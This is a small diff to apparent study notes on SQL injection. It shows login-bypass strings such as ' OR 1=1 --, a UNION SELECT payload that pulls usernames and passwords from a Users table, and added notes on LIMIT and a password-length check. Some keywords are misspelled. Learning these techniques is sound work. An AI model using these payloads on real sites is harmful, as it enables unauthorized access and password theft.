@@ -3,6 +3,10 @@ Look for input fields and URLs that have parameters
 - -> username = Ahmed' --   || Ahmed'; -- 
 - -> username=' OR 1=1 --   || ' OR 1=1; --
 
+
+`LIMIT 2` > only retrieve two rows
+`LENGHT (password) = 4`
+
 ### UNION-based Attack
 `password = pass123' UNION SELECT username, passwird FROM Users;--`
 ### ORDER BY
